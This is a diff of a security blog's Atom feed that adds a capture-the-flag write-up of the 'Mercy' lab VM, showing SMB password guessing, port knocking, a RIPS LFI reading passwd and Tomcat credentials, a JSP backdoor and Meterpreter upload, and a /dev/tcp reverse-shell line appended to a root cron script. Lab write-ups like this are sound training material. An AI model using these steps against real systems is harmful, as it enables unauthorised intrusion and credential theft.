@@ -4,7 +4,7 @@
   <title><![CDATA[Category: writeups | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2019-05-30T22:11:54+03:00</updated>
+  <updated>2019-06-09T21:54:05+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,513 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[No Mercy]]></title>
+    <link href="http://chousensha.github.io/blog/2019/06/09/no-mercy/"/>
+    <updated>2019-06-09T21:43:54+03:00</updated>
+    <id>http://chousensha.github.io/blog/2019/06/09/no-mercy</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s VM is inspired from the OSCP labs!</p>
+
+<!-- more -->
+
+
+<p>There are quite a few ports open, and some filtered:</p>
+
+<p><code>
+PORT     STATE    SERVICE     VERSION
+22/tcp   filtered ssh
+53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
+| dns-nsid:
+|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
+80/tcp   filtered http
+110/tcp  open     pop3        Dovecot pop3d
+|_pop3-capabilities: SASL PIPELINING CAPA TOP UIDL AUTH-RESP-CODE STLS RESP-CODES
+|_ssl-date: TLS randomness does not represent time
+139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp  open     imap        Dovecot imapd (Ubuntu)
+|_imap-capabilities: STARTTLS more have IMAP4rev1 post-login ID listed SASL-IR LOGINDISABLEDA0001 ENABLE LITERAL+ capabilities LOGIN-REFERRALS IDLE Pre-login OK
+|_ssl-date: TLS randomness does not represent time
+445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+993/tcp  open     ssl/imaps?
+|_ssl-date: TLS randomness does not represent time
+995/tcp  open     ssl/pop3s?
+|_ssl-date: TLS randomness does not represent time
+8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
+| http-methods:
+|_  Potentially risky methods: PUT DELETE
+|_http-open-proxy: Proxy might be redirecting requests
+| http-robots.txt: 1 disallowed entry
+|_/tryharder/tryharder
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat
+</code></p>
+
+<p>The available web server is a Tomcat installation. In the <a href="http://192.168.159.137:8080/tryharder/tryharder">http://192.168.159.137:8080/tryharder/tryharder</a> we find a base64 string:</p>
+
+<p><code>
+SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==
+</code></p>
+
+<p>Decoding this hints at insecure passwords:</p>
+
+<p>```
+It&rsquo;s annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.</p>
+
+<p>Once, we found the password &ldquo;password&rdquo;, quite literally sticking on a post-it in front of an employee&rsquo;s desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.</p>
+
+<p>No fluffy bunnies for those who set insecure passwords and endanger the enterprise.
+```</p>
+
+<p>From all the other services, the one that seems most likely to be bruteforced is Samba. So let&rsquo;s have a look:</p>
+
+<p>```
+smbmap -H 192.168.159.137
+[+] Finding open SMB ports&hellip;.
+[+] Guest SMB session established on 192.168.159.137&hellip;
+[+] IP: 192.168.159.137:445 Name: 192.168.159.137</p>
+
+<pre><code>Disk                                                    Permissions
+----                                                    -----------
+print$                                              NO ACCESS
+qiu                                                 NO ACCESS
+IPC$                                                NO ACCESS
+</code></pre>
+
+<p>```</p>
+
+<p>The <em>qiu</em> share is what we want to look at. Running <strong>enum4linux</strong> we find 2 accounts:</p>
+
+<h1>```</h1>
+
+<h1>|    Users on 192.168.159.137    |</h1>
+
+<p>index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: pleadformercy    Name: QIU   Desc:
+index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: qiu  Name:   Desc:
+```</p>
+
+<p>Following the hint, I tried the share with a password of <em>password</em> and it worked for user <em>qiu</em>:</p>
+
+<p><code>
+smbclient //192.168.159.137/qiu -U qiu
+Enter WORKGROUP\qiu's password:
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Fri Aug 31 15:07:00 2018
+  ..                                  D        0  Mon Nov 19 11:59:09 2018
+  .bashrc                             H     3637  Sun Aug 26 09:19:34 2018
+  .public                            DH        0  Sun Aug 26 10:23:24 2018
+  .bash_history                       H      163  Fri Aug 31 15:11:34 2018
+  .cache                             DH        0  Fri Aug 31 14:22:05 2018
+  .private                           DH        0  Sun Aug 26 12:35:34 2018
+  .bash_logout                        H      220  Sun Aug 26 09:19:34 2018
+  .profile                            H      675  Sun Aug 26 09:19:34 2018
+</code></p>
+
+<p>I mounted the share locally for easier browsing with <code>mount -t cifs //192.168.159.137/qiu /mnt/ctf -o username=qiu -o password=password</code>. Then I started looking through what we have. The .bash_history file shows us the last commands entered by user qiu:</p>
+
+<p><code>
+exit
+cd ../
+cd home
+cd qiu
+cd .secrets
+ls -al
+cd .private
+ls
+cd secrets
+ls
+ls -al
+cd ../
+ls -al
+cd opensesame
+ls -al
+./configprint
+sudo configprint
+sudo su -
+exit
+</code></p>
+
+<p>The .public folder contains a message that doesn&rsquo;t seem relevant but is sound advice!</p>
+
+<p><code>
+cat .public/resources/smiley
+A cheerful smile to start the day is always good. :-)
+</code></p>
+
+<p>We have more to check inside .private:</p>
+
+<p><code>
+root@deck:/mnt/ctf/.private# ls
+opensesame  readme.txt  secrets
+</code></p>
+
+<p>Readme contents are:</p>
+
+<p><code>
+This is for your own eyes only. In case you forget the magic rules for remote administration.
+</code></p>
+
+<p>The secrets folder is empty. Inside <em>opensesame</em> there&rsquo;s a config file that contains port knocking instructions for opening HTTP and SSH:</p>
+
+<p>```
+cat config
+Here are settings for your perusal.</p>
+
+<p>Port Knocking Daemon Configuration</p>
+
+<p>[options]</p>
+
+<pre><code>UseSyslog
+</code></pre>
+
+<p>[openHTTP]</p>
+
+<pre><code>sequence    = 159,27391,4
+seq_timeout = 100
+command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
+tcpflags    = syn
+</code></pre>
+
+<p>[closeHTTP]</p>
+
+<pre><code>sequence    = 4,27391,159
+seq_timeout = 100
+command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
+tcpflags    = syn
+</code></pre>
+
+<p>[openSSH]</p>
+
+<pre><code>sequence    = 17301,28504,9999
+seq_timeout = 100
+command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+tcpflags    = syn
+</code></pre>
+
+<p>[closeSSH]</p>
+
+<pre><code>sequence    = 9999,28504,17301
+seq_timeout = 100
+command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+tcpflags    = syn
+</code></pre>
+
+<p>```</p>
+
+<p>I used a quick Bash one-liner for the port knocking:</p>
+
+<p><code>
+for port in 159 27391 4; do nmap -Pn --host-timeout 100 --max-retries 0 -p $port 192.168.159.137; done
+</code></p>
+
+<p>Now port 80 was opened and we find a message stating that: &ldquo;This machine shall make you plead for mercy! Bwahahahahaha!&rdquo;. In the robots.txt file we find 2 entries:</p>
+
+<p><code>
+Disallow: /mercy
+Disallow: /nomercy
+</code></p>
+
+<p>Inside /mercy there&rsquo;s an index file that hints at possible RCE:</p>
+
+<p>```
+Welcome to Mercy!</p>
+
+<p>We hope you do not plead for mercy too much. If you do, please help us upgrade our website to allow our visitors to obtain more than just the local time of our system.
+```</p>
+
+<p>Inside /nomercy there&rsquo;s a <a href="https://github.com/robocoder/rips-scanner">RIPS installation</a>. RIPS is a PHP static scanner that looks for vulnerabilities in the source code.</p>
+
+<p><img class="center" src="/images/pentest/mercy/rips.png" title="&lsquo;rips&rsquo; &lsquo;rips&rsquo;" ></p>
+
+<p>The version 0.53 is vulnerable to a <a href="https://www.exploit-db.com/exploits/18660">LFI exploit</a>. Going to <a href="http://192.168.159.137/nomercy/windows/code.php?file=../../../../../../etc/passwd">http://192.168.159.137/nomercy/windows/code.php?file=../../../../../../etc/passwd</a> gives us the contents of the passwd file. Here are the last 4 users:</p>
+
+<p><code>
+&lt;? pleadformercy:x:1000:1000:pleadformercy:/home/pleadformercy:/bin/bash
+&lt;? qiu:x:1001:1001:qiu:/home/qiu:/bin/bash
+&lt;? thisisasuperduperlonguser:x:1002:1002:,,,:/home/thisisasuperduperlonguser:/bin/bash
+&lt;? fluffy:x:1003:1003::/home/fluffy:/bin/sh
+</code></p>
+
+<p>With this LFI, we can take a look at the <code>/etc/tomcat7/tomcat-users.xml</code> to search for credentials:</p>
+
+<p><code>
+&lt;? &lt;role rolename="admin-gui"/&gt;
+&lt;? &lt;role rolename="manager-gui"/&gt;
+&lt;? &lt;user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/&gt;
+&lt;? &lt;user username="fluffy" password="freakishfluffybunny" roles="none"/&gt;
+</code></p>
+
+<p>We can now login to Tomcat and upload a reverse shell. I used a nice tool called <a href="https://github.com/mgeeky/tomcatWarDeployer">tomcatWarDeployer</a> that automatically generates and deploys a JSP backdoor.</p>
+
+<p>```
+python tomcatWarDeployer.py -h
+Usage: tomcatWarDeployer.py [options] server</p>
+
+<p>  server        Specifies server address. Please also include port after colon. May start with <a href="http://">http://</a> or <a href="https://">https://</a></p>
+
+<p>Options:
+  -h, &mdash;help            show this help message and exit</p>
+
+<p>  General options:</p>
+
+<pre><code>-V, --version       Version information.
+-v, --verbose       Verbose mode.
+-s, --simulate      Simulate breach only, do not perform any offensive
+                    actions.
+-G OUTFILE, --generate=OUTFILE
+                    Generate JSP backdoor only and put it into specified
+                    outfile path then exit. Do not perform any
+                    connections, scannings, deployment and so on.
+-U USER, --user=USER
+                    Tomcat Manager Web Application HTTP Auth username.
+                    Default=&lt;none&gt;, will try various pairs.
+-P PASS, --pass=PASS
+                    Tomcat Manager Web Application HTTP Auth password.
+                    Default=&lt;none&gt;, will try various pairs.
+</code></pre>
+
+<p>  Connection options:</p>
+
+<pre><code>-H RHOST, --host=RHOST
+                    Remote host for reverse tcp payload connection. When
+                    specified, RPORT must be specified too. Otherwise,
+                    bind tcp payload will be deployed listening on 0.0.0.0
+-p PORT, --port=PORT
+                    Remote port for the reverse tcp payload when used with
+                    RHOST or Local port if no RHOST specified thus acting
+                    as a Bind shell endpoint.
+-u URL, --url=URL   Apache Tomcat management console URL. Default: empty
+-t TIMEOUT, --timeout=TIMEOUT
+                    Speciifed timeout parameter for socket object and
+                    other timing holdups. Default: 10
+</code></pre>
+
+<p>  Payload options:</p>
+
+<pre><code>-R, --remove        Remove deployed app with specified name. Can be used
+                    for post-assessment cleaning
+-X PASSWORD, --shellpass=PASSWORD
+                    Specifies authentication password for uploaded shell,
+                    to prevent unauthenticated usage. Default: randomly
+                    generated. Specify "None" to leave the shell
+                    unauthenticated.
+-T TITLE, --title=TITLE
+                    Specifies head&gt;title for uploaded JSP WAR payload.
+                    Default: "JSP Application"
+-n APPNAME, --name=APPNAME
+                    Specifies JSP application name. Default: "jsp_app"
+-x, --unload        Unload existing JSP Application with the same name.
+                    Default: no.
+-C, --noconnect     Do not connect to the spawned shell immediately. By
+                    default this program will connect to the spawned
+                    shell, specifying this option let's you use other
+                    handlers like Metasploit, NetCat and so on.
+-f WARFILE, --file=WARFILE
+                    Custom WAR file to deploy. By default the script will
+                    generate own WAR file on-the-fly.
+</code></pre>
+
+<p>```</p>
+
+<p>All I had to do was provide the credentials and the host/port combination. The host specified by the -H flag is where I&rsquo;m expecting the shell:</p>
+
+<p>```
+python tomcatWarDeployer.py -v -x -p 8888 -H 192.168.159.129 192.168.159.137:8080 -U thisisasuperduperlonguser -P heartbreakisinevitable</p>
+
+<pre><code>    tomcatWarDeployer (v. 0.5.2)
+Apache Tomcat auto WAR deployment &amp; launching tool
+Mariusz B. / MGeeky '16-18
+</code></pre>
+
+<p>Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.</p>
+
+<p>INFO: Reverse shell will connect to: 192.168.159.129:8888.
+DEBUG: Trying Creds: [&ldquo;thisisasuperduperlonguser:heartbreakisinevitable&rdquo;]:</p>
+
+<pre><code>Browsing to "http://192.168.159.137:8080/"...
+</code></pre>
+
+<p>DEBUG: Trying to fetch: &ldquo;<a href="http://192.168.159.137:8080/">http://192.168.159.137:8080/</a>&rdquo;
+DEBUG: Trying to fetch: &ldquo;<a href="http://192.168.159.137:8080/manager">http://192.168.159.137:8080/manager</a>&rdquo;
+DEBUG: Probably found something: Apache Tomcat/7.0.52 (Ubuntu)
+INFO: Apache Tomcat/7.0.52 (Ubuntu) Manager Application reached &amp; validated.
+INFO:   At: &ldquo;<a href="http://192.168.159.137:8080/manager">http://192.168.159.137:8080/manager</a>&rdquo;
+DEBUG: Generating JSP WAR backdoor code&hellip;
+DEBUG: Preparing additional code for Reverse TCP shell
+DEBUG: Generating temporary structure for jsp_app WAR at: &ldquo;/tmp/tmpjo2Kgz&rdquo;
+DEBUG: Working with Java at version: 11.0.3
+DEBUG: Generating web.xml with servlet-name: &ldquo;JSP Application&rdquo;
+DEBUG: Generating WAR file at: &ldquo;/tmp/jsp_app.war&rdquo;
+DEBUG: adding: META-INF/ (in=0) (out=0) (stored 0%)
+adding: META-INF/MANIFEST.MF (in=56) (out=56) (stored 0%)
+adding: files/ (in=0) (out=0) (stored 0%)
+adding: files/META-INF/ (in=0) (out=0) (stored 0%)
+adding: files/META-INF/MANIFEST.MF (in=66) (out=65) (deflated 1%)
+adding: files/WEB-INF/ (in=0) (out=0) (stored 0%)
+adding: files/WEB-INF/web.xml (in=505) (out=254) (deflated 49%)
+adding: index.jsp (in=4498) (out=1688) (deflated 62%)</p>
+
+<h2>Total:</h2>
+
+<p>(in = 5109) (out = 2917) (deflated 42%)
+DEBUG: Tree command not available. Skipping.
+DEBUG: WAR file structure:
+DEBUG:
+DEBUG: Checking if app jsp_app is deployed at: <a href="http://192.168.159.137:8080/manager">http://192.168.159.137:8080/manager</a>
+DEBUG: App not deployed.
+INFO: It looks that the application with specified name &ldquo;jsp_app&rdquo; has not been deployed yet.
+DEBUG: Deploying application: jsp_app from file: &ldquo;/tmp/jsp_app.war&rdquo;
+DEBUG: Removing temporary WAR directory: &ldquo;/tmp/tmpjo2Kgz&rdquo;
+INFO: WAR DEPLOYED! Invoking it&hellip;
+DEBUG: Spawned shell handling thread. Awaiting for the event&hellip;
+DEBUG: Awaiting for reverse-shell handler to set-up
+DEBUG: Establishing listener for incoming reverse TCP shell at 192.168.159.129:8888
+DEBUG: Socket is binded to local port now, awaiting for clients&hellip;
+DEBUG: Invoking application at url: &ldquo;<a href="http://192.168.159.137:8080/jsp_app/">http://192.168.159.137:8080/jsp_app/</a>&rdquo;
+DEBUG: Adding &lsquo;X-Pass: u48rHHa9MRdK&rsquo; header for shell functionality authentication.
+DEBUG: Incoming client: 192.168.159.137:60760
+DEBUG: Application invoked correctly.
+INFO: &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+INFO: JSP Backdoor up &amp; running on <a href="http://192.168.159.137:8080/jsp_app/">http://192.168.159.137:8080/jsp_app/</a>
+INFO:
+Happy pwning. Here take that password for web shell: &lsquo;u48rHHa9MRdK&rsquo;
+INFO: &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;</p>
+
+<p>INFO: Connected with: tomcat7@MERCY</p>
+
+<p>tomcat7@MERCY $
+```</p>
+
+<p>Unfortunately, I found this shell too unstable, so I switched to Metasploit and spawned a Meterpreter shell:</p>
+
+<p>```
+msf5 exploit(multi/http/tomcat_mgr_upload) > run</p>
+
+<p>[<em>] Started reverse TCP handler on 192.168.159.129:4444
+[</em>] Retrieving session ID and CSRF token&hellip;
+[<em>] Uploading and deploying oAsjCH3JZVzYcanqTIdZkOcn&hellip;
+[</em>] Executing oAsjCH3JZVzYcanqTIdZkOcn&hellip;
+[<em>] Undeploying oAsjCH3JZVzYcanqTIdZkOcn &hellip;
+[</em>] Sending stage (53844 bytes) to 192.168.159.137
+[*] Meterpreter session 2 opened (192.168.159.129:4444 &ndash;> 192.168.159.137:41182) at 2019-06-04 11:04:16 -0400</p>
+
+<p>meterpreter >
+```</p>
+
+<p>I dropped into a shell and upgraded it to a proper terminal with <code>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;</code>. From this shell, I was able to switch to user fluffy with the previously found password of <code>freakishfluffybunny</code>.</p>
+
+<p>```
+tomcat7@MERCY:/var/lib/tomcat7$ su fluffy
+su fluffy
+Password: freakishfluffybunny</p>
+
+<p>Added user fluffy.
+$ python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
+python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
+fluffy@MERCY:~$ ls -a
+ls -a
+.  ..  .bash_history  .private
+```</p>
+
+<p>There are a few interesting files in fluffy&rsquo;s home:</p>
+
+<p><code>
+fluffy@MERCY:~/.private/secrets$ ls -a
+ls -a
+.  ..  backup.save  .secrets  timeclock
+</code></p>
+
+<p>The backup.save file is a shell script that just outputs a text:</p>
+
+<p>```
+cat backup.save</p>
+
+<h1>!/bin/bash</h1>
+
+<p>echo Backing Up Files;
+```</p>
+
+<p>In .secrets we have a Try harder! message. And the timeclock outputs the current date and time inside the web folder:</p>
+
+<p>```
+luffy@MERCY:~/.private/secrets$ cat timeclock
+cat timeclock</p>
+
+<h1>!/bin/bash</h1>
+
+<p>now=$(date)
+echo &ldquo;The system time is: $now.&rdquo; > ../../../../../var/www/html/time
+echo &ldquo;Time check courtesy of LINUX&rdquo; >> ../../../../../var/www/html/time
+chown www-data:www-data ../../../../../var/www/html/time
+```</p>
+
+<p>This should be the local time reference from earlier. What&rsquo;s more interesting, this script is owned by root and everyone has full permissions on it:</p>
+
+<p><code>
+-rwxrwxrwx 1 root   root   222 Nov 20  2018 timeclock
+</code></p>
+
+<p>I appended a bash one-liner to the script to send me a shell: <code>bash -i >&amp; /dev/tcp/192.168.159.129/8888 0>&amp;1</code>. But if we just run the script, the shell will still be with fluffy&rsquo;s privileges. There should be a cron or something run by root. As I was investigating, I received a root shell on my listener!</p>
+
+<p><code>
+root@MERCY:~# ls /root
+ls /root
+author-secret.txt
+config
+proof.txt
+root@MERCY:~# cat /root/proof.txt
+cat /root/proof.txt
+Congratulations on rooting MERCY. :-)
+</code></p>
+
+<p>Indeed, cron was running the timeclock script every 3 minutes:</p>
+
+<p><code>
+*/3 * * * * bash /home/fluffy/.private/secrets/timeclock
+</code></p>
+
+<p>And the final flag and a message from the author:</p>
+
+<p>```
+root@MERCY:~# cat author-secret.txt
+cat author-secret.txt
+Hi! Congratulations on being able to root MERCY.</p>
+
+<p>The author feels bittersweet about this box. On one hand, it was a box designed as a dedication to the sufferance put through by the Offensive Security team for PWK. I thought I would pay it forward by creating a vulnerable machine too. This is not meant to be a particularly difficult machine, but is meant to bring you through a good number of enumerative steps through a variety of techniques.</p>
+
+<p>The author would also like to thank a great friend who he always teases as &ldquo;plead for mercy&rdquo;. She has been awesome. The author, in particular, appreciates her great heart, candour, and her willingness to listen to the author&rsquo;s rants and troubles. The author will stay forever grateful for her presence. She never needed to be this friendly to the author.</p>
+
+<p>The author, as &ldquo;plead for mercy&rdquo; knows, is terrible at any sort of dedication or gifting, and so the best the author could do, I guess, is a little present, which explains the hostname of this box. (You might also have been pleading for mercy trying to root this box, considering its design.)</p>
+
+<p>You&rsquo;ll always be remembered, &ldquo;plead for mercy&rdquo;, and Offensive Security, for making me plead for mercy!</p>
+
+<p>Congratulations, once again, for you TRIED HARDER!</p>
+
+<p>Regards,
+The Author
+```</p>
+
+<p>This was a nice box, the RIPS vector was definitely an interesting touch!</p>
+
+<p>```</p>
+
+<hr />
+
+<p>/ If your life was a horse, you&rsquo;d have to \</p>
+
+<h2>\ shoot it.                               /</h2>
+
+<pre><code>         \   ^__^
+            \  (oo)\_______
+                 (__)\       )\/\
+                         ||----w |
+                         ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pond. Analoguepond]]></title>
@@ -179,7 +686,7 @@ Copyright &copy; 2005-2015 by Matteo Cantoni (www.nothink.org)</p>
 <p>  Host IP address               : 192.168.159.136
   Hostname                      : analoguepond
   Description                   : Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
-  Contact                       : Eric Burdon <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x65;&#x72;&#105;&#99;&#64;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#x2e;&#x63;&#x6f;&#x6d;">&#x65;&#x72;&#x69;&#99;&#64;&#x65;&#x78;&#97;&#109;&#112;&#108;&#x65;&#x2e;&#x63;&#x6f;&#x6d;</a>
+  Contact                       : Eric Burdon <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x65;&#114;&#x69;&#99;&#x40;&#101;&#120;&#97;&#x6d;&#112;&#108;&#101;&#46;&#99;&#111;&#x6d;">&#101;&#x72;&#105;&#x63;&#64;&#x65;&#x78;&#x61;&#x6d;&#112;&#x6c;&#101;&#46;&#x63;&#x6f;&#x6d;</a>
   Location                      : There is a house in New Orleans they call it&hellip;
   Uptime snmp                   : 05:15:30.80
   Uptime system                 : 05:15:20.10
@@ -675,7 +1182,7 @@ gpg: WARNING: message was not integrity protected
 gpg nleeson_key.gpg > nleeson_key
 chmod 600 nleeson</p>
 
-<h1>ssh -i nleeson <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#110;&#108;&#x65;&#x65;&#115;&#111;&#x6e;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#49;&#50;&#50;&#46;&#51;">&#110;&#x6c;&#x65;&#101;&#115;&#111;&#x6e;&#64;&#x31;&#57;&#50;&#46;&#x31;&#54;&#56;&#46;&#x31;&#x32;&#x32;&#x2e;&#51;</a></h1>
+<h1>ssh -i nleeson <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#110;&#x6c;&#x65;&#x65;&#x73;&#x6f;&#x6e;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#x32;&#x32;&#46;&#x33;">&#110;&#x6c;&#101;&#x65;&#115;&#x6f;&#110;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#50;&#x32;&#46;&#x33;</a></h1>
 
 <p>Enter passphrase for key &lsquo;nleeson&rsquo;:
 Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 4.4.0-57-generic x86_64)</p>
@@ -984,7 +1491,7 @@ a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
 <p>Now we can SSH on the box:</p>
 
 <p>```
-ssh -i stinky_key <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x73;&#x74;&#105;&#x6e;&#107;&#x79;&#64;&#100;&#x65;&#x72;&#x70;&#x6e;&#x73;&#x74;&#x69;&#x6e;&#x6b;&#x2e;&#x6c;&#111;&#99;&#97;&#x6c;">&#x73;&#x74;&#105;&#110;&#x6b;&#x79;&#x40;&#x64;&#x65;&#x72;&#x70;&#110;&#x73;&#116;&#105;&#110;&#x6b;&#46;&#x6c;&#111;&#x63;&#97;&#x6c;</a>
+ssh -i stinky_key <a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#x73;&#x74;&#x69;&#x6e;&#x6b;&#121;&#x40;&#x64;&#x65;&#x72;&#112;&#110;&#x73;&#x74;&#x69;&#x6e;&#107;&#46;&#x6c;&#111;&#99;&#x61;&#108;">&#x73;&#116;&#x69;&#110;&#x6b;&#121;&#x40;&#x64;&#x65;&#114;&#112;&#x6e;&#x73;&#116;&#105;&#110;&#107;&#x2e;&#108;&#111;&#99;&#97;&#x6c;</a>
 Ubuntu 14.04.5 LTS</p>
 
 <pre><code>                   ,~~~~~~~~~~~~~..
@@ -1036,7 +1543,7 @@ pass1=derpderpderpderpderpderpderp
 
 <p>```
 mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log
-From: Help Desk <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#104;&#101;&#x6c;&#112;&#100;&#101;&#115;&#x6b;&#x40;&#x64;&#101;&#114;&#x70;&#110;&#115;&#116;&#105;&#110;&#107;&#x2e;&#108;&#x6f;&#x63;&#97;&#108;">&#x68;&#101;&#x6c;&#112;&#x64;&#x65;&#115;&#x6b;&#x40;&#100;&#x65;&#x72;&#112;&#x6e;&#x73;&#x74;&#x69;&#x6e;&#x6b;&#x2e;&#108;&#x6f;&#x63;&#97;&#x6c;</a>
+From: Help Desk <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#104;&#x65;&#108;&#112;&#x64;&#x65;&#115;&#107;&#64;&#x64;&#x65;&#x72;&#112;&#110;&#x73;&#116;&#x69;&#x6e;&#x6b;&#x2e;&#x6c;&#111;&#x63;&#x61;&#x6c;">&#x68;&#101;&#108;&#x70;&#100;&#101;&#115;&#107;&#x40;&#100;&#x65;&#114;&#112;&#110;&#x73;&#x74;&#x69;&#110;&#107;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;</a>
 Date: Thu, Aug 23, 2017 at 1:29 PM
 Subject: sudoers ISSUE=242 PROJ=26
 To: Derp, Mr (mrderp) [C]
@@ -1352,7 +1859,7 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof
 <p>And the SSH user is orwell. So let&rsquo;s copy the private key to our machine and try to SSH in as orwell:</p>
 
 <p>```
-ssh -i id_ed25519 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x6f;&#114;&#x77;&#101;&#x6c;&#x6c;&#64;&#49;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#49;&#53;&#x39;&#x2e;&#49;&#51;&#x32;">&#111;&#x72;&#x77;&#x65;&#x6c;&#x6c;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#53;&#57;&#46;&#49;&#51;&#x32;</a>
+ssh -i id_ed25519 <a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#111;&#114;&#119;&#101;&#108;&#108;&#64;&#x31;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#x31;&#x35;&#57;&#46;&#49;&#51;&#x32;">&#x6f;&#114;&#x77;&#101;&#108;&#108;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#49;&#53;&#x39;&#46;&#49;&#x33;&#50;</a>
 Welcome to</p>
 
 <hr />
@@ -1370,7 +1877,7 @@ if you run into any issue you can find me on Twitter: @dhn_
 or feel free to write me a mail to:</p>
 
 <ul>
-<li>Email: <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#x64;&#x68;&#110;&#64;&#x7a;&#x65;&#114;&#48;&#x2d;&#100;&#x61;&#x79;&#46;&#112;&#119;">&#x64;&#104;&#x6e;&#x40;&#122;&#101;&#x72;&#48;&#x2d;&#100;&#x61;&#121;&#46;&#112;&#119;</a></li>
+<li>Email: <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#100;&#x68;&#110;&#64;&#122;&#101;&#x72;&#48;&#x2d;&#x64;&#97;&#x79;&#x2e;&#112;&#x77;">&#x64;&#104;&#x6e;&#x40;&#x7a;&#101;&#x72;&#x30;&#45;&#100;&#97;&#121;&#46;&#112;&#119;</a></li>
 <li>GPG key: 0x2641123C</li>
 <li>GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C</li>
 </ul>
@@ -1479,7 +1986,7 @@ YES!! You did it :&ndash;). Congratulations!</p>
 
 <p>I hope you enjoyed this CTF VM.</p>
 
